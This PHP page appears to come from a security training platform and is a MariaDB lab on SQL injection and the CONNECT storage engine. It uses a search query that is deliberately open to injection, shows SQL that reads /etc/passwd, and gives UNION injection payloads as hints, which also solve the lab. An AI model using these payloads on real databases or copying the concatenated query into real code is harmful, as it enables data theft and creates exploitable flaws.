<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   SECRET VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT secret_value FROM engine_secrets WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['secret_value']) {
        $_SESSION['mariadb_lab2_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab2", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 2. CONNECT Engine: Remote Tables</h3>

    <h4>Scenario</h4>
    <p>
        A product catalog application runs on MariaDB and uses a simple search feature.
        Behind the scenes, the DBA has installed the <strong>CONNECT storage engine</strong>,
        which allows MariaDB to create tables that read directly from external sources
        (CSV files, ODBC databases, remote MySQL servers, XML, JSON, and more).
    </p>
    <p>
        In a real attack, an attacker with <code>CREATE TABLE</code> privileges could use
        <code>ENGINE=CONNECT</code> to read arbitrary files from the filesystem:
    </p>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">CONNECT Engine. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>CREATE TABLE read_passwd (<br>
            &nbsp;&nbsp;line VARCHAR(255)<br>
            ) ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd';<br><br>
            <span class="prompt">mariadb&gt; </span>SELECT * FROM read_passwd;<br>
            <span class="comment">-- Reads /etc/passwd via the CONNECT engine!</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The product search is vulnerable to UNION injection. Use it to extract the
        <strong>secret value</strong> from the hidden <code>engine_secrets</code> table.
        In a real scenario, the CONNECT engine would let you pivot to external data sources.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The search query returns 3 columns (id, name, price).<br>
        2. Discover hidden tables: <code>' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -</code><br>
        3. Extract the secret: <code>' UNION SELECT secret_value, NULL, NULL FROM engine_secrets -- -</code><br>
        4. Bonus: check if CONNECT engine is installed: <code>' UNION SELECT engine, support, NULL FROM information_schema.engines WHERE engine='CONNECT' -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Secret Value</h4>
    <form method="POST" class="form-row">
        <input type="text" name="admin_password" class="input" placeholder="Enter the engine secret (flag)..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab2_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You used UNION injection to extract the CONNECT engine secret. In a real scenario, the CONNECT engine could expose filesystem contents and remote databases.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Product Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="search" class="input" placeholder="Search products (try: MariaDB)" value="<?= htmlspecialchars($_POST['search'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['search'])) {
    $search = $_POST['search'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, name, price FROM products WHERE name LIKE '%$search%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute and display results
    try {
    $result = mysqli_query($conn, $query);

    if (!$result) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
        echo '</div>';
    } else {
        $rows = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $rows[] = $row;
        }

        if (empty($rows)) {
            echo '<div class="result-warning result-box">No products found.</div>';
        } else {
            echo '<table class="result-table">';
            echo '<tr><th>ID</th><th>Product</th><th>Price</th></tr>';
            foreach ($rows as $row) {
                echo '<tr>';
                echo '<td>' . htmlspecialchars($row['id'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['name'] ?? '') . '</td>';
                echo '<td>$' . htmlspecialchars($row['price'] ?? '') . '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }
    }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
